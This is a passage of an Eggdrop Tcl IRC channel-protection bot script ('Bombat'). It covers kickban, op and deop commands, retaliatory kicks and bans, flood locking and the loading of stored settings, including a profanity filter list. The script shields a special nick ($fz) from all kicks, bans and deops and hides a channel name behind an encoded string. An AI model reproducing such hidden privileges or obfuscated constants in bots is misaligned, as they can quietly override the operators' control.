  global fxlogo1 botnick own bannick
  set chantarget [lindex $rest 0]
  set nicktarget [lindex $rest 1]
  set bmask [getchanhost $nicktarget $chantarget]
  set bmask "*!*@[lindex [split $bmask @] 1]"
  set reason [lrange $rest 2 end]
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Ditolak!"
    return 0
  }
  if {($chantarget == "") || ($nicktarget == "")} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: kickban <#chan> <Nick> <Reason>"
    return 0
  }
  if {[isop $botnick $chantarget]!=1} {
    puthlp "NOTICE $nick :$fxlogo1 NoT OP CHaNNEL $chantarget"
    return 0
  }
  if {![onchan $nicktarget $chantarget]} {
    puthlp "NOTICE $nick :$fxlogo1 $nicktarget is not on the channel."
    return 0
  }
  if {$nicktarget == $botnick} {
    puthlp "NOTICE $nick :$fxlogo1 I cant self kick."
    return 0
  }
  if {[matchattr $nicktarget n] && ![matchattr $nick Z]} {
    puthlp "NOTICE $nick :$fxlogo1 I cant kickban my ADmIN."
    return 0
  }
  if {$reason == ""} {
    set reason "4KICKBAN1 request4..!"
    if {[matchattr $nick m]} {
      set reason "4KICKBAN1 request [banmsg]"
    }
    if {[matchattr $nick n]} {
      set reason "4KICKBAN1 request [banmsg]"
    }
  }
  foreach x [channels] {
    if {[string tolower $x]==[string tolower $chantarget]} {
      set bannick($nicktarget) $bmask
      putsrv "KICK $x $nicktarget :$fxlogo1 $reason"
      return 0
    }
  }
  puthlp "NOTICE $nick :$fxlogo1 NoT IN $chantarget"
}

proc msg_op {nick uhost hand rest} {
  global fxlogo1 botnick
  set chantarget [lindex $rest 0]
  set nicktarget [lindex $rest 1]
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  if {($chantarget == "") || ($nicktarget == "")} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: op <#chan> <Nick>"
    return 0
  }
  if {[isop $botnick $chantarget]!=1} {
    puthlp "NOTICE $nick :$fxlogo1 NoT OP CHaNNEL $chantarget"
    return 0
  }
  if {![onchan $nicktarget $chantarget]} {
    puthlp "NOTICE $nick :$fxlogo1 $nicktarget is not on the channel."
    return 0
  }
  if {[isop $nicktarget $chantarget]!=0} {
    puthlp "NOTICE $nick :$fxlogo1 $nicktarget is already op on CHaNNEL $chantarget"
    return 0
  }
  foreach x [channels] {
    if {[string tolower $x] == [string tolower $chantarget]} {
      opq $x $nicktarget
      return 0
    }
  }
  puthlp "NOTICE $nick :$fxlogo1 NoT IN $chantarget"
}

proc msg_voice {nick uhost hand rest} {
  global fxlogo1 botnick
  set chantarget [lindex $rest 0]
  set nicktarget [lindex $rest 1]
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Ditolak!"
    return 0
  }
  if {($chantarget == "") || ($nicktarget == "")} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: voice <#chan> <Nick>"
    return 0
  }
  if {[isop $botnick $chantarget]!=1} {
    puthlp "NOTICE $nick :$fxlogo1 NoT OP CHaNNEL $chantarget"
    return 0
  }
  if {![onchan $nicktarget $chantarget]} {
    puthlp "NOTICE $nick :$fxlogo1 $nicktarget is not on the channel."
    return 0
  }
  if {[isvoice $nicktarget $chantarget]} {
    puthlp "NOTICE $nick :$fxlogo1 $nicktarget is already voice on channel $chantarget"
  }
  foreach x [channels] {
    if {[string tolower $x]==[string tolower $chantarget]} {
      putserv "mode $x +v $nicktarget"
      return 0
    }
  }
  puthlp "NOTICE $nick :$fxlogo1 NoT IN $chantarget"
}

proc msg_deop {nick uhost hand rest} {
  global fxlogo1 botnick own
  set chantarget [lindex $rest 0]
  set nicktarget [lindex $rest 1]
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Ditolak!"
    return 0
  }
  if {($chantarget == "") || ($nicktarget == "")} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: deop <#chan> <Nick>"
    return 0
  }
  if {[isop $botnick $chantarget] != 1} {
    puthlp "NOTICE $nick :$fxlogo1 NoT OP CHaNNEL $chantarget"
    return 0
  }
  if {![onchan $nicktarget $chantarget]} {
    puthlp "NOTICE $nick :$fxlogo1 $nicktarget is not on the channel."
    return 0
  }
  if {![isop $nicktarget $chantarget]} {
    puthlp "NOTICE $nick :$fxlogo1 $chantarget is not op on CHaNNEL $chantarget"
    return 0
  }
  if {$nicktarget == $botnick} {
    puthlp "NOTICE $nick :$fxlogo1 I CaNT SeLF DEoP!"
    return 0
  }
  if {[matchattr $nicktarget n]} {
    puthlp "NOTICE $nick :$fxlogo1 I cant deop my Owner."
    return 0
  }
  if {[matchattr $nick m]} {
    set mreq "1r4e1quest"
  }
  if {[matchattr $nick n]} {
    set mreq "1r4e1quest"
  }
  foreach x [channels] {
    if {[string tolower $x]==[string tolower $chantarget]} {
      if {![string match "*k*" [getchanmode $x]]} {
        putserv "mode $x -ko $mreq $nicktarget"
      } else {
        putserv "mode $x -o $nicktarget"
      }
      return 0
    }
  }
  puthlp "NOTICE $nick :$fxlogo1 NoT IN $chantarget"
}

proc msg_devoice {nick uhost hand rest} {
  global fxlogo1 botnick owner
  set chantarget [lindex $rest 0]
  set nicktarget [lindex $rest 1]
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Ditolak!"
    return 0
  }
  if {($chantarget == "") || ($nicktarget == "")} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: devoice <#chan> <Nick>"
    return 0
  }
  if {[isop $botnick $chantarget]!=1} {
    puthlp "NOTICE $nick :$fxlogo1 NoT OP CHaNNEL $chantarget"
    return 0
  }
  if {![onchan $nicktarget $chantarget]} {
    puthlp "NOTICE $nick :$fxlogo1 $nicktarget is not on the channel."
  }
  if {![isvoice $nicktarget $chantarget]} {
    puthlp "NOTICE $nick :$fxlogo1 $nicktarget is not voice on CHaNNEL $chantarget"
  }
  if {$nicktarget == $owner} {
    puthlp "NOTICE $nick :$fxlogo1 I cant devoice my owner."
    return 0
  }
  foreach x [channels] {
    if {[string tolower $x]==[string tolower $chantarget]} {
      putserv "mode $x -v $nicktarget"
      return 0
    }
  }
  puthlp "NOTICE $nick :$fxlogo1 NoT IN $chantarget"
}

proc prot:kick {nick uhost handle chan knick reason} {
  global fxlogo1 fxlogo2 botnick fz kickme fxlogo3 bannick igflood botname quick fxc is_m op_it is_ban iskick
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {[string match "*Bombat*" $reason]} {
    set igflood($nick) "1"
  }
  if {[info exists iskick($knick$chan)]} {
    unset iskick($knick$chan)
  }
  if {$nick == $botnick} {
    if {[info exists kickme($knick)]} {
      if {$kickme($knick) == 1} {
        set kickme($knick) 2
      }
      if {$kickme($knick) == 3} {
        catch { unset kickme($knick) }
      }
    }
    if {[string match "*Bombat*" $reason]} {
      if {![info exists bannick($knick)]} { return 0 }
      if {[info exists is_ban($bannick($knick)$chan)]} { return 0 }
      set is_ban($bannick($knick)$chan) 1
      if {$bannick($knick) == "*!*@*"} { return 0 }
      set cmode [getchanmode $chan]
      set ok_m "1"
      if {[info exists is_m($chan)]} {
        set ok_m "0"
      }
      if {[isutimer "set_-m $chan"]} {
        set ok_m "0"
      }
      if {[string match "*m*" $cmode]} {
        set ok_m "0"
      }
      if {$ok_m == "1"} {
        set is_m($chan) 1
        if {$quick == "1"} {
          putquick "mode $chan +b $bannick($knick)"
        } else {
          putserv "mode $chan +b $bannick($knick)"
        }
      } else {
        if {$quick == "1"} {
          putquick "mode $chan +b $bannick($knick)"
        } else {
          putserv "mode $chan +b $bannick($knick)"
        }
      }
      return 0
    } else {
      if {![info exists bannick($knick)]} { return 0 }
      if {$bannick($knick) == "*!*@*"} { return 0 }
      putserv "mode $chan +b $bannick($knick)"
      if {[string match "*3 Menit*" $reason]} { utimer 180 [list unbanq $chan $bannick($knick)] }
    }
    return 0
  }
  if {$nick == $knick} { return 0 }
  if {$nick == "ChanServ"} { return 0 }
  if {[matchattr $nick f]} { return 0 }
  if {[string match "*Bombat*" $reason]} { return 0 }
  if {$knick == $botnick} {
    if {[info exists kickme($nick)]} {
      set kickme($nick) 3
      if {[string tolower $chan] != $fxc} {
        putsrv "ChanServ deop $chan $nick"
      }
    } else {
      if {[matchattr $cflag D]} {
        set kickme($nick) 1
      }
    }
    puthlp "JOIN $chan"
    return 0
  }
  if {![isop $botnick $chan]} { return 0 }
  if {$knick == $fz} {
    putserv "KICK $chan $nick :[lgrnd] 1DonT KIcK 4$fz1..!"
    set op_it($knick) 1
    return 0
  }
  if {[matchattr $knick n]} {
    putsrv "KICK $chan $nick :[lgrnd] 1admin 4KICK1 protection4..!"
    set op_it($knick) 1
    return 0
  }
  if {[matchattr $knick m]} {
    putsrv "KICK $chan $nick :[lgrnd] 1master 4KICK1 protection4..!"
    set op_it($knick) 1
    return 0
  }
}

proc unbanq {chan host} {
  global botnick
  if {[isop $botnick $chan]} {
    puthelp "mode $chan -b $host"
  }
}

set banidx 1

proc banmsg {} {
  global banidx bancounter
  set banidx [incr banidx]
  if {$banidx >= [llength $bancounter]} { set banidx 1 }
  set banmsg [lindex $bancounter $banidx]
}

proc banms {} {
  global banidx bancounter
  set banidx [incr banidx]
  if {$banidx >= [llength $bancounter]} { set banidx 1 }
  set banms [lindex $bancounter $banidx]
}

proc ban_chk {nick uhost handle channel mchange bhost} {
  global botnick botname fz quick fxlogo1 bannick ban-time igflood invme ex_flood
  set mhost [string range $bhost [string first "@" $bhost] end]
  set cflag "c$channel"
  set cflag [string range $cflag 0 8]
  if {[info exists invme($mhost)]} {
    catch { unset invme($mhost) }
  }
  if {[info exists ex_flood($mhost)]} {
    catch { unset ex_flood($mhost) }
  }
  if {![isop $botnick $channel]} { return 0 }
  set banmask "*!*[string range $uhost [string first "@" $uhost] end]"
  if {$banmask == "*!*@*"} { set banmask "$nick!*@*" }
  if {$bhost == "*!*@*"} {
    utimer [rand 4] [list unbanq $channel $bhost]
    return 1
  }
  set cmode [getchanmode $channel]
  if {[getuser "config" XTRA "IPG"] != ""} {
    foreach ipg [getuser "config" XTRA "IPG"] {
      if {[string match $ipg $bhost] || [string match $bhost $ipg]} {
        if {![isutimer "IPG $bhost"]} {
          if {![string match "*v*" $cmode]} {
            puthelp "mode $channel -vb 4i1p.guard $bhost"
          } else { puthelp "mode $channel -b $bhost" }
          utimer 60 [list putlog "&#171;Bombat&#187; IPGuARD $bhost"]
        }
        return 1
      }
    }
  }
  if {[string match [string tolower $bhost] [string tolower $botname]]} {
    if {![matchattr $nick f] && $nick != $botnick && $nick != "ChanServ" && ![string match "*allnetwork.org" $nick] && ![info exists igflood($nick)]} {
      if {[matchattr $cflag D]} {
        if {$quick == "1"} {
          putqck "KICK $channel $nick :$fxlogo1 4SELF BAN DEFENSE1 strike back.......!!"
        } else {  putsrv "KICK $channel $nick :$fxlogo1 4SELF BAN DEFENSE1 strike back.......!!" }
      }
      if {![string match "*v*" $cmode]} {
        if {$quick == "1"} {
          putquick "mode $channel -vb+b 1aut4o1.unban $bhost $banmask"
        } else { putserv "mode $channel -vb+b 1aut4o1.unban $bhost $banmask" }
      } else {
        if {$quick == "1"} {
          putquick "mode $channel -b+b $bhost $banmask"
        } else { putserv "mode $channel -b+b $bhost $banmask" }
      }
    } else {
      if {![string match "*v*" $cmode]} {
        if {$quick == "1"} {
          putquick "mode $channel -vb 1aut4o1.unban $bhost"
        } else { putserv "mode $channel -vb auto.unban $bhost" }
      } else {
        if {$quick == "1"} {
          putquick "mode $channel -b $bhost"
        } else { putserv "mode $channel -b $bhost" }
      }
    }
    return 1
  }
  foreach knick [chanlist $channel] {
    if {[string match [string tolower $bhost] [string tolower $knick![getchanhost $knick $channel]]]} {
      if {[matchattr $knick f]} {
        if {$knick != $fz} { utimer [rand 4] [list unbanq $channel $bhost] }
        if {[matchattr $nick f] || $nick == $botnick || $nick == "ChanServ" || [string match "*allnetwork.org" $nick] || [info exists igflood($nick)]} { return 1 }
      }
      if {$knick == $fz} {
        if {$nick != $botnick} {
          putsrv "KICK $channel $nick :$fxlogo1 1DonT BaNnEd 4$fz1..!"
          if {![string match "*k*" $cmode]} {
            putserv "mode $channel -kb 1guarding.4$fz $bhost"
          } else { putserv "mode $channel -b $bhost" }
        } else { putserv "mode $channel -b $bhost" }
        return 1
      }
      if {[matchattr $knick n]} {
        if {$nick != $botnick} {
          set bannick($nick) $banmask
          putsrv "KICK $channel $nick :$fxlogo1 1DonT BaN 4$knick1..!"
        }
        return 1
      }
      if {[matchattr $knick m]} {
        if {$nick != $botnick} { putsrv "KICK $channel $nick :$fxlogo1 1DonT BaN 4$knick1..!" }
        return 1
      }
      if {[matchattr $cflag E]} {
        if {$nick == $botnick} {
          set menforce [rand 4]
          if {$menforce == 1} {
            putsrv "KICK $channel $knick :$fxlogo1 1banned from: 4[string toupper $channel] [banms]"
          } elseif {$menforce == 2} {
            putsrv "KICK $channel $knick :$fxlogo1 1you are rejected from 4[unsix $bhost] [banms]"
          } elseif {$menforce == 3} {
            putsrv "KICK $channel $knick :$fxlogo1 1enforcing ban set: 4[unsix $bhost] [banms]"
          } else {
            putsrv "KICK $channel $knick :$fxlogo1 1you're not welcome in 4[string toupper $channel] [banms]"
          }
        } else {
          if {[matchattr $nick n]} {
            putsrv "KICK $channel $knick :$fxlogo1 4ADmIN1 BaNnEd 4OuT1..!"
          } else {
            if {[matchattr $nick m]} {
              putsrv "KICK $channel $knick :$fxlogo1 4MasTeR1 BaNnEd 4OuT1..!"
            } else {
              if {[isop $knick $channel] && ![matchattr $nick f]} { return 1 }
              if {![matchattr $knick f]} {
                set menforce [rand 5]
                if {$menforce == 1} {
                  putsrv "KICK $channel $knick :$fxlogo1 1ban setted by 4@$nick [banms]"
                } elseif {$menforce == 2} {
                  putsrv "KICK $channel $knick :$fxlogo1 1match ban from: 4[unsix $bhost] [banms]"
                } elseif {$menforce == 3} {
                  putsrv "KICK $channel $knick :$fxlogo1 1banished from 4[string toupper $channel] [banms]"
                } elseif {$menforce == 4} {
                  putsrv "KICK $channel $knick :$fxlogo1 1enforcing ban from: 4[unsix $bhost] [banms]"
                } else {
                  putsrv "KICK $channel $knick :$fxlogo1 1get out from 4[string toupper $channel] [banms]"
                }
              }
            }
          }
        }
      }
    }
  }
  return 0
}


proc prot:deop {nick uhost handle channel mchange {opnick ""}} {
  global botnick deopme fz fxc invme virus_nick quick fxlogo1 bannick lastkey unop igflood is_m op_it
  set cflag "c$channel"
  set cflag [string range $cflag 0 8]
  set mode [lindex $mchange 0]
  if {$opnick == ""} {
    set opnick [lindex $mchange 1]
  }
  if {$mode == "-m"} {
    foreach x [utimers] {
      if {[string match "*set_-m $channel*" $x] || [string match "*TRAFFIC $channel*" $x]} {
        killutimer [lindex $x 2]
      }
    }
    catch {unset is_m($channel)}
    if {![botisop $channel]} { return 0 }
    if {[matchattr $cflag V]} {
      foreach x [chanlist $channel] {
        if {$x != $botnick && ![isvoice $x $channel] && ![isop $x $channel] && ![matchattr $x O]} {
          set cret [getuser $cflag XTRA "VC"]
          foreach ct [utimers] {
            if {[string match "*voiceq*" $ct]} {
              if {[expr [lindex $ct 0] + [getuser $cflag XTRA "VC"]] > $cret} {
                set cret [expr [lindex $ct 0] + [getuser $cflag XTRA "VC"]]
              }
            }
          }
          utimer $cret [list voiceq $channel $x]
        }
      }
    }
    return 0
  }
  if {$mode == "+k"} {
    set lastkey $opnick
    if {[matchattr $cflag K] && [matchattr $nick Z]} {
      putlog "&#171;Bombat&#187; key change to $opnick"
      setuser $cflag XTRA "CI" [zip $opnick]
      saveuser
    }
  }
  if {$mode == "-k"} {
    catch { unset lastkey }
    if {$nick != $botnick} {
      set igflood($nick) "1"
    }
    return 0
  }
  if {$mode == "+m"} {
    foreach x [utimers] {
      if {[string match "*set_-m $channel*" $x] || [string match "*voiceq $channel*" $x] || [isutimer "advq $channel"]} {
        killutimer [lindex $x 2]
      }
    }
    if {$nick == $botnick} {
      if {![string match "*m*" [lindex [channel info $channel] 0]]} {
        if {[string match "*+shared*" [channel info $channel]]} {
          puthelp "PRIVMSG $channel :fLood detected, temporary locked..!"
        }
        utimer 70 [list set_-m $channel]
        if {[isutimer "TRAFFIC $channel"]} {
          utimer 20 [list pub_nobot "*" "*" "*" $channel "*"]
          return 0
        }
      }
    } else {
      if {[isutimer "goback"]} {
        catch { clearqueue all }
        foreach x [utimers] {
          if {[string match "*del_nobase*" $x]} { killutimer [lindex $x 2] }
          if {[string match "*goback*" $x]} { killutimer [lindex $x 2] ; goback }
        }
        utimer 2 del_nobase
        return 0
      }
      utimer [expr 1800 + [rand 60]] [list set_-m $channel]
    }
    return 0
  }
  if {$mode == "+b"} {
    if {$opnick == "*!*@f.l.o.o.d-d.e.t.e.c.t.e.d"} {
      utimer 40 [list putlog "&#171;Bombat&#187; TRAFFIC $channel"]
      if {$nick == $botnick} {
        utimer 40 [list putserv "mode $channel -bm *!*@f.l.o.o.d-d.e.t.e.c.t.e.d"]
        if {[info exists is_m($channel)]} { return 0 }
        if {$quick == "1"} {
          putquick "mode $channel +m"
        } else {
          putserv "mode $channel +m"
        }
        set is_m($channel) 1
        return 0
      }
    }
    ban_chk $nick $uhost $handle $channel $mchange $opnick
    return 0
  }
  if {$mode == "-b"} {
    if {[info exists is_ban($opnick$channel)]} {
      catch {unset is_ban($opnick$channel)}
    }
    if {[isutimer "unbanq $channel $opnick"]} {
      foreach x [utimers] {
        if {[string match "*unbanq $channel $opnick*" $x]} {
          killutimer [lindex $x 2]
        }
      }
    }
    foreach x [ignorelist] {
      if {[lindex $x 0] == $opnick} {
        unsetignore [lindex $x 0]
        return 0
      }
    }
    return 0
  }
  if {$nick == $opnick} { return 0 }
  if {$opnick == $botnick && $mode == "+o"} {
    chk_on_op $channel
    return 0
  }
  if {$mode == "+o" && [isop $botnick $channel]} {
    if {[info exists op_it($opnick)]} {
      catch {unset op_it($opnick)}
    }
    if {[matchattr $opnick O]} {
      set cmode [getchanmode $channel]
      if {![string match "*k*" $cmode]} {
        puthelp "mode $channel -ko 1no4@1p.list $opnick"
      } else {
        puthelp "mode $channel -o $opnick"
      }
      return 0
    }
    if {[info exists unop($opnick)]} {
      if {$nick == "ChanServ"} {
        catch { unset unop($opnick) }
        return 0
      }
      if {[matchattr $opnick f] || [matchattr $nick f] || $nick == $botnick} {
        return 0
      }
      utimer [expr 5 + [rand 10]] [list unallowed $channel $nick $opnick]
      return 0
    }
  }
  if {$mode == "-o"} {
    foreach x [utimers] {
      if {[string match "*unallowed $channel $opnick*" $x]} { killutimer [lindex $x 2] }
    }
    if {$opnick == $botnick} {
      if {[isutimer "DEOP $channel"]} { return 0 }
      foreach x [utimers] {
        if {[string match "*gop $channel*" $x]} { killutimer [lindex $x 2] }
      }
      utimer 2 [list putlog "&#171;Bombat&#187; DEOP $channel"]
      if {![matchattr $nick f] && $nick != "ChanServ" && ![string match "*allnetwork.org" $nick] && ![string match "User*" $botnick]} {
        if {![info exists igflood($nick)]} {
          if {[matchattr $cflag D]} {
            set deopme $nick
          }
        }
      }
      if {![matchattr $nick m]} {
        if {[string tolower $channel] != $fxc} {
          if {![string match "*+protectfriends*" [channel info $channel]]} {
            putlog "&#171;Bombat&#187; !Log! CHaNOP <<$channel>>"
            putsrv "ChanServ op $channel $botnick"
          }
        }
      }
      return 0
    }
    if {![isop $botnick $channel]} { return 0 }
    if {[isutimer "deopprc*$opnick"]} {
      foreach x [utimers] {
        if {[string match "*deopprc*$opnick*" $x]} {
          putlog "&#171;Bombat&#187; !UnDeOp OR UnKIcK!"
          catch { killutimer [lindex $x 2] }
        }
      }
    }
    if {$nick == "ChanServ" && [matchattr $opnick o]} {
      voiceq $channel $opnick
      return 0
    }
    if {$nick == "ChanServ"} {
      set unop($opnick) "1"
      return 0
    }
    if {[matchattr $nick f] || $nick == $botnick} { return 0 }
    if {$nick == "ChanServ"} { return 0 }
    if {$opnick == $fz} {
      if {![info exists igflood($nick)]} {
        putserv "KICK $channel $nick :$fxlogo1 1DonT De@p 4$fz1..!"
      }
      opq $channel $opnick
      return 0
    }
    if {[matchattr $opnick n]} {
      if {![info exists igflood($nick)]} {
        putsrv "KICK $channel $nick :$fxlogo1 1ADmIN 4De@p1 GuaRd4..!"
        opq $channel $opnick
      }
      return 0
    }
    if {[matchattr $opnick m]} {
      if {![info exists igflood($nick)]} {
        putsrv "KICK $channel $nick :$fxlogo1 1MasTeR 4De@p1 GuaRd1..!"
        opq $channel $opnick
      }
      return 0
    }
    if {[matchattr $opnick o]} {
      opq $channel $opnick
      return 0
    }
  }
}

proc unallowed {chan nick opnick} {
  if {![botisop $chan]} { return 0 }
  if {![isop $nick $chan]} { return 0 }
  if {[isop $opnick $chan]} { return 0 }
  putserv "mode $chan -ko 1ChanServ.ngamuk $nick"
}

proc chk_nicks {unick uhost hand chan newnick} {
  global fxlogo1 bannick botnick nick
  if {$unick == $nick && $unick != $botnick} {
    putsrv "NICK $nick"
  }
  if {[matchattr $unick Q]} {
    chattr $unick -Q
    foreach x [getuser $unick HOSTS] {
      delhost $unick $x
    }
    set hostmask "${unick}!*@*"
    setuser $unick HOSTS $hostmask
    saveuser
  }
  if {![isop $botnick $chan]} { return 0 }
  if {[isutimer "deopprc*$unick"]} {
    foreach x [utimers] {
      if {[string match "*deopprc*$unick*" $x]} {
        putlog "&#171;Bombat&#187; !UnDeOp!"
        catch { killutimer [lindex $x 2] }
      }
    }
  }
  if {[string match "Guest*" $newnick]} {
    if {[matchattr $unick f]} { return 0 }
    if {[isop $newnick $chan]} {
      utimer [expr 80 + [rand 20]] [list deopprc $chan $newnick]
      return 0
    }
  }
  if {[matchattr $newnick O] && [isop $newnick $chan]} {
    set cmode [getchanmode $chan]
    if {![string match "*k*" $cmode]} {
      putserv "mode $chan -ko 1no4@1p.list $newnick"
    } else {
      putserv "mode $chan -o $newnick"
    }
  }
  akick_chk $newnick $uhost $chan
  spam_chk $newnick $uhost $hand $chan
  return 0
}

proc msg_identify {nick uhost hand rest} {
  global fxlogo1
  set id [lindex $rest 0]
  set password [lindex $rest 1]
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Ditolak!"
    return 0
  }
  if {($id == "") || ($password == "")} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: identify <nick> <password>"
    return 0
  }
  putsrv "NickServ identify $id $password"
  puthlp "NOTICE $nick :$fxlogo1 Identify to $id"
  return 0
}

proc pub_realnick {unick uhost hand chan rest} {
  global fxlogo1 keep-nick nick
  if {![matchattr $unick Q]} {
    puthlp "NOTICE $unick :$fxlogo1 Ditolak"
    return 0
  }
  set keep-nick 1
  putsrv "NICK $nick"
  return 0
}

proc rands {length} {
  set chars "abcdefghijklmnopqrstupwxyz"
  set count [string length $chars]
  for {set i 0} {$i < $length} {incr i} {
    append result [string index $chars [rand $count]]
  }
  return $result
}

proc pub_randnick {unick uhost hand chan rest} {
  global fxlogo1 keep-nick nick altnick botnick
  if {$rest != ""} {
    set keep-nick 0
    set nickch "[lindex $rest 0]\[[rand 9][rand 9][randstring 1]\]"
    putsrv "NICK $nickch"
  } else {
    if {$botnick != $nick && $botnick != $altnick} { return 0 }
    set keep-nick 0
    putsrv "NICK [rands 8]"
  }
  return 0
}

proc pub_altnick {nick uhost hand chan rest} {
  global altnick keep-nick fxlogo1
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Ditolak"
    return 0
  }
  set keep-nick 0
  putsrv "NICK $altnick"
}

proc not_away { from keyword arg } {
  if {[isutimer "del_nobase"]} { utimer 1 del_nobase }
  if {[isutimer "goback"]} { utimer 2 goback }
  unsetignore "*!*@*"
}

proc nickERROR { from keyword arg } {
  global nick
  set nick "FX[unixtime]"
}

proc ch_moderate { from keyword arg } {
  putlog "&#171;Bombat&#187; Cant send to channel!"
  if {[isutimer "del_nobase"]} {
    catch { clearqueue all }
    foreach x [utimers] {
      if {[string match "*del_nobase*" $x]} { killutimer [lindex $x 2] ; utimer 1 del_nobase }
    }
  }
}

proc ch_invite { from keyword arg } {
  global double joinme fxlogo1 fxc
  set chan [lindex $arg 1]
  if {$double == 0} {
    if {$joinme != "" && [string tolower $chan] != $fxc} {
      puthlp "NOTICE $joinme :$fxlogo1 $chan 4(+I)"
    }
    if {[string tolower $chan] != $fxc} {
      putsrv "ChanServ invite $chan"
    }
    set double 1
    return 0
  }
  if {$double == 1} {
    if {[string match "*+statuslog*" [channel info $chan]]} {
      if {$joinme != "" && [string tolower $chan] != $fxc} {
        puthlp "NOTICE $joinme :$fxlogo1 ReMOVE $chan 4(+I)"
      }
      channel remove $chan
      savechan
    }
    set joinme ""
    set double 0
  }
  return
}

proc ch_banned { from keyword arg } {
  global double joinme fxlogo1 fxc
  set chan [lindex $arg 1]
  if {$double == 0} {
    if {$joinme != "" && [string tolower $chan] != $fxc} {
      puthlp "NOTICE $joinme :$fxlogo1 $chan 4(+B)"
    }
    if {[string tolower $chan] != $fxc} {
      putsrv "ChanServ invite $chan"
      puthlp "ChanServ unban $chan"
    }
    set double 1
    return 0
  }
  if {$double == 1} {
    if {[string match "*+statuslog*" [channel info $chan]]} {
      if {$joinme != "" && [string tolower $chan] != $fxc} {
        puthlp "NOTICE $joinme :$fxlogo1 ReMovE $chan 4(+B)"
      }
      if {[string tolower $chan] != $fxc} {
        putsrv "ChanServ invite $chan"
      }
      channel remove $chan
      savechan
    }
    set joinme ""
    set double 0
  }
  return 0
}

proc ch_key { from keyword arg } {
  global double joinme fxlogo1 lastkey fxc
  set chan [lindex $arg 1]
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {$double == 0} {
    if {$joinme != "" && [string tolower $chan] != $fxc} {
      puthlp "NOTICE $joinme :$fxlogo1 $chan 4(+K)"
    }
    if {[matchattr $cflag K]} {
      puthlp "JOIN $chan :[dezip [getuser $cflag XTRA "CI"]]"
    } else {
      puthlp "JOIN $chan"
    }
    if {[info exists lastkey]} {
      puthlp "JOIN $chan :$lastkey"
    }
    set double 1
    return 0
  }
  if {$double == 1} {
    if {[string match "*+statuslog*" [channel info $chan]]} {
      if {$joinme != "" && [string tolower $chan] != $fxc} {
        puthlp "NOTICE $joinme :$fxlogo1 ReMovE $chan 4(+K)"
      }
      channel remove $chan
      savechan
      return 0
    }
    if {[string tolower $chan] != $fxc} {
      putsrv "ChanServ invite $chan"
    }
    set joinme ""
    set double 0
  }
  return 0
}

proc ch_full { from keyword arg } {
  global double joinme fxlogo1 botnick fxc
  set chan [lindex $arg 1]
  if {[isop $botnick $chan]} {
    set bans ""
    set i 0
    foreach x [chanbans $chan] {
      if {$i < 5} {
        append bans " [lindex $x 0]"
        set i [incr i]
      }
    }
    putserv "MODE $chan -kbbbbb 1clearing.banlist $bans"
    return 0
  }
  if {$double == 0} {
    if {$joinme != "" && [string tolower $chan] != $fxc} {
      puthlp "NOTICE $joinme :$fxlogo1 $chan 4(+L)"
    }
    if {[string tolower $chan] != $fxc} {
      putsrv "ChanServ invite $chan"
    }
    set double 1
    return 0
  }
  if {$double == 1} {
    if {[string match "*+statuslog*" [channel info $chan]]} {
      if {$joinme != "" && [string tolower $chan] != [dezip ".X/K9/wcDUE/XN07j1i7Vos1"]} {
        puthlp "NOTICE $joinme :$fxlogo1 ReMOVE $chan 4(+L)"
      }
      channel remove $chan
      savechan
    }
    set joinme ""
    set double 0
  }
  return 0
}

if {$altnick == ""} { set altnick [randstring 7] }

set badwords ""

proc config {} {
  global nick nickpass altpass altnick realname owner kops my-ip banner
  global fxlogo1 logstore cfgfile badwords ban-time my-hostname kickclr
  if {[validuser "config"]} {
    if {[getuser "config" XTRA "REALNAME"]!=""} {
      set realname [dezip [getuser "config" XTRA "REALNAME"]]
    } else {
      set realname [lgrnd]
    }
    if {[getuser "config" XTRA "USERNAME"]!=""} {
      set realname [dezip [getuser "config" XTRA "USERNAME"]]
    }
    if {[getuser "config" XTRA "NICK"]!=""} {
      set nick [dezip [getuser "config" XTRA "NICK"]]
    }
    if {[getuser "config" XTRA "NICKPASS"]!=""} {
      set nickpass [dezip [getuser "config" XTRA "NICKPASS"]]
    }
    if {[getuser "config" XTRA "ALTNICK"]!=""} {
      set altnick [dezip [getuser "config" XTRA "ALTNICK"]]
    }
    if {[getuser "config" XTRA "ALTPASS"]!=""} {
      set altpass [dezip [getuser "config" XTRA "ALTPASS"]]
    }
    if {[getuser "config" XTRA "BAN"]!=""} {
      set banner [dezip [getuser "config" XTRA "BAN"]]
    }
    if {[getuser "config" XTRA "BANTIME"]!=""} {
      set ban-time [getuser "config" XTRA "BANTIME"]
    }
    if {[getuser "config" XTRA "BADWORDS"]!=""} {
      set badwords [getuser "config" XTRA "BADWORDS"]
    }
    if {$badwords == ""} {
      set badwords "bitch kimak memek kontol kanjut bangsat ngentot fuck peler bajingan vagina shit asshole anjing babi kampang baruak anjiang pantek meseng kancit kacuk"
      setuser "config" XTRA "BADWORDS" $badwords
    }
    if {[getuser "config" XTRA "KOPS"]!=""} {
      set kops "T"
    }
    if {[getuser "config" XTRA "KCLR"]!=""} {
      set kickclr "T"
    }
    if {[getuser "config" XTRA "VHOST"]!=""} {
      set my-hostname [getuser "config" XTRA "VHOST"]
      set my-ip [getuser "config" XTRA "VHOST"]
    }
    if {[getuser "config" XTRA "LOGCHAN"]!=""} {
      putlog "&#171;Bombat&#187; !Log! CReATING LOG FiLE <<[getuser "config" XTRA "LOGCHAN"]>>"
      set logstore "${cfgfile}.log"
      logfile jpk [getuser "config" XTRA "LOGCHAN"] $logstore
    }
  } else {
    adduser "config" ""
    chattr "config" "-hp"
  }
  foreach x [userlist] {
    chattr $x -Q
    if {$x != "config" && $x != "AKICK"} {
      foreach y [getuser $x HOSTS] {
